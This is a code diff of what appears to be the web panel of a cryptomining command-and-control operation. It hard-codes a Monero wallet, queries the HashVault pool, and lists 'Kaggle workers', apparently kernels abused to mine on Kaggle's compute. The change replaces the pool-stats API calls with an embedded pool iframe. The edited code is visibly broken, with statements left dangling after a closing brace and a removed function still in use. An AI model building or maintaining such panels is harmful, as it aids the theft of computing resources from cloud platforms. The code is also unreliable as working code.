@@ -331,8 +331,7 @@
     }
     
     const WALLET = '44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5';
-    const POOL_URL = 'https://hashvault.pro';
-    const POOL_API = 'https://hashvault.pro/api';
+    const POOL_URL = 'https://xmr.hashvault.pro';
 
     function switchTab(tab) {
         try {
@@ -360,103 +359,13 @@
         }
     }
 
-    async function fetchPoolStats() {
-        if (typeof C2_DEBUG !== 'undefined') {
-            C2_DEBUG.debug('HashVault', 'Fetching pool stats...');
+    // Auto-load dashboard iframe on page load
+    document.addEventListener('DOMContentLoaded', function() {
+        const iframe = document.getElementById('pool-iframe');
+        if (iframe) {
+            iframe.src = `${POOL_URL}/en?user=${WALLET}`;
         }
-        try {
-            const response = await fetch(`${POOL_API}/miner/${WALLET}/stats`);
-            if (!response.ok) throw new Error('API returned ' + response.status);
-            const data = await response.json();
-            
-            document.getElementById('total-hashrate').textContent = formatHashrate(data.hash || 0);
-            document.getElementById('total-paid').textContent = formatXMR(data.amtPaid || 0);
-            document.getElementById('pending-balance').textContent = formatXMR(data.amtDue || 0);
-            
-            const workers = data.workers || {};
-            const workerCount = Object.keys(workers).length;
-            document.getElementById('active-workers').textContent = workerCount;
-            document.getElementById('workers-count').textContent = workerCount + ' workers';
-            
-            const tbody = document.getElementById('workers-tbody');
-            tbody.innerHTML = '';
-            
-            if (workerCount === 0) {
-                tbody.innerHTML = '<tr><td colspan="5"><div class="empty-state"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg><p>No active workers</p></div></td></tr>';
-            } else {
-                Object.entries(workers).forEach(([workerId, worker]) => {
-                    const row = document.createElement('tr');
-                    const lastShare = worker.lastShare ? new Date(worker.lastShare * 1000).toLocaleString() : 'Never';
-                    const isOnline = worker.lastShare && (Date.now() / 1000 - worker.lastShare) < 600;
-                    
-                    row.innerHTML = `
-                        <td>${workerId}</td>
-                        <td><span class="status-badge ${isOnline ? 'online' : 'offline'}"><span class="dot"></span>${isOnline ? 'Online' : 'Offline'}</span></td>
-                        <td class="hashrate-value">${formatHashrate(worker.hash || 0)}</td>
-                        <td>${lastShare}</td>
-                        <td>${worker.totalHash || 0}</td>
-                    `;
-                    tbody.appendChild(row);
-                });
-            }
-            C2_DEBUG.success('HashVault', 'Pool stats loaded: ' + workerCount + ' workers');
-        } catch (error) {
-            C2_DEBUG.error('HashVault', 'Error fetching pool stats', error);
-            document.getElementById('workers-tbody').innerHTML = 
-                '<tr><td colspan="5"><div class="empty-state"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg><p>Error loading data</p></div></td></tr>';
-        }
-    }
-
-    async function fetchKaggleWorkers() {
-        C2_DEBUG.debug('HashVault', 'Fetching Kaggle workers...');
-        try {
-            const response = await fetch('/api/kaggle/agents/status');
-            if (!response.ok) throw new Error('API returned ' + response.status);
-            const data = await response.json();
-            
-            const tbody = document.getElementById('kaggle-workers-tbody');
-            tbody.innerHTML = '';
-            
-            const count = data.agents?.length || 0;
-            document.getElementById('kaggle-count').textContent = count + ' kernels';
-            
-            if (count === 0) {
-                tbody.innerHTML = '<tr><td colspan="6"><div class="empty-state"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><path d="M8 21h8M12 17v4"/></svg><p>No Kaggle workers deployed</p></div></td></tr>';
-            } else {
-                data.agents.forEach(agent => {
-                    const row = document.createElement('tr');
-                    const isOnline = agent.status === 'online';
-                    const lastCheckin = agent.last_checkin ? new Date(agent.last_checkin * 1000).toLocaleString() : 'Never';
-                    
-                    row.innerHTML = `
-                        <td>${agent.kernel_id}</td>
-                        <td>${agent.info?.kernel_slug || 'N/A'}</td>
-                        <td>${agent.kernel_id.split('-')[1] || 'N/A'}</td>
-                        <td><span class="status-badge ${isOnline ? 'online' : 'offline'}"><span class="dot"></span>${isOnline ? 'Online' : 'Offline'}</span></td>
-                        <td class="hashrate-value">~2.5 KH/s</td>
-                        <td>${lastCheckin}</td>
-                    `;
-                    tbody.appendChild(row);
-                });
-            }
-            C2_DEBUG.success('HashVault', 'Kaggle workers loaded: ' + count);
-        } catch (error) {
-            C2_DEBUG.error('HashVault', 'Error fetching Kaggle workers', error);
-        }
-    }
-
-    function formatHashrate(hash) {
-        if (hash >= 1000000) return (hash / 1000000).toFixed(2) + ' MH/s';
-        if (hash >= 1000) return (hash / 1000).toFixed(2) + ' KH/s';
-        return (hash || 0).toFixed(2) + ' H/s';
-    }
-
-    function formatXMR(amount) {
-        return ((amount || 0) / 1000000000000).toFixed(6) + ' XMR';
-    }
-
-    function refreshStats() {
-        fetchPoolStats();
+    });
         fetchKaggleWorkers();
         showNotification('Pool stats refreshed', 'green');
         C2_DEBUG.info('HashVault', 'Stats refreshed manually');
